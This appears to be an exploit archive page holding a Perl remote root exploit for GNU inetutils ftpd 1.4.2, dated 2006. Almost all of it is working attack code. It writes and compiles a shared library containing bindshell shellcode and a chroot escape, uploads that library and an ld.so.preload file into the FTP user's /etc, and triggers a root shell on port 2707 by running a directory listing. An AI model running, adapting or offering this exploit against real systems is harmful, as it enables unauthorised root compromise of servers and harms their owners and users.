<html><head><title>GNU InetUtils ftpd 1.4.2 (ld.so.preload) Remote Root Exploit</title></head><pre># FTP server (GNU inetutils 1.4.2) Remote Root Exploit
# This program remotely exploits the most recent
# versions of GNU inetutils ftpd on linux systems.
#
# Requirements:
# 1. There MUST be a chroot'ed environment for the logged in user
# 2. Directory etc must be writeable by the logged in user (duh!)
#
# The exploit works as follows:
# 1. Create a shared library including a bindshell
# 2. Create a ld.so.preload file referencing the previously created shared library
# 3. Connect to the remote ftp server and log in using the ftp account
# 4. Upload the shared library and ld.so.preload into /etc
# 5. Run /bin/ls
#
# Result:
# uname -a;id;
# Linux XXXXX 2.6.11.9-vs2.0-rc1-node #1 SMP Fri May 13 11:52:23 CEST 2005 i686 GNU/Linux
# uid=0(root) gid=0(root) egid=70(ftp) groups=70(ftp)
#
# wu-ftpd has a setuid(ftp) before the execv to
# /bin/ls so there is no way escaping the chroot issued before.
#
# signed,
# kingcope Dec/2006
##############################################################################################

use Net::FTP;
open FILE, &quot;&gt;program.c&quot;;
print FILE &lt;&lt;EOF;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;

#define L_PORT &quot;\\x0a\\x93&quot;       /* Port 2707 */

char ficken[] = &quot;\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x99\\x52\\x53\\x6a\\x02\\x89&quot;
                &quot;\\xe1\\xcd\\x80\\x52\\x43\\x68\\xff\\x02&quot;L_PORT&quot;\\x89\\xe1&quot;
                &quot;\\x6a\\x10\\x51\\x50\\x89\\xe1\\x89\\xc6\\xb0\\x66\\xcd\\x80&quot;
                &quot;\\x43\\x43\\xb0\\x66\\xcd\\x80\\x52\\x56\\x89\\xe1\\x43\\xb0&quot;
                &quot;\\x66\\xcd\\x80\\x89\\xd9\\x89\\xc3\\xb0\\x3f\\x49\\xcd\\x80&quot;
                &quot;\\x41\\xe2\\xf8\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f&quot;
                &quot;\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80&quot;;

void _init()
{
  char *sh[2]={&quot;/bin/sh&quot;,NULL};
  int gg=0xed;

  FILE *f;
  setreuid(0,0);
  setuid(0);
  remove(&quot;/etc/ld.so.preload&quot;);
  chdir(&quot;/&quot;);
  chroot(&quot;etc&quot;);
  while(gg!=0) {
        chdir(&quot;..&quot;);gg--;
  }
  chroot(&quot;..&quot;);

  void (*fc)();
  (long) fc = &amp;ficken;
  fc();
}

EOF
close FILE;
open FILE,&quot;&gt;ld.so.preload&quot;;
print FILE &quot;/etc/libno_ex.so.1.0&quot;;
close FILE;
system(&quot;gcc -o program.o -c program.c -fPIC;gcc -shared -Wl,-soname,libno_ex.so.1 -o libno_ex.so.1.0 program.o -nostartfiles&quot;);
$ftp = Net::FTP-&gt;new($ARGV[0], Debug =&gt; 1) or die &quot;Cannot connect to some.host.name: $@&quot;;
$ftp-&gt;login(&quot;ftp&quot;,&quot;ftp@&quot;) or die &quot;Cannot login &quot;, $ftp-&gt;message;
$ftp-&gt;binary;
$ftp-&gt;put(&quot;libno_ex.so.1.0&quot;, &quot;/etc/libno_ex.so.1.0&quot;);
$ftp-&gt;put(&quot;ld.so.preload&quot;, &quot;/etc/ld.so.preload&quot;);
print &quot;\n\nNOTE: Running LS command, check the bindshell on port 2707.\n\n&quot;;
$ftp-&gt;dir();
$ftp-&gt;quit();

# milw0rm.com [2006-12-15]</pre></html>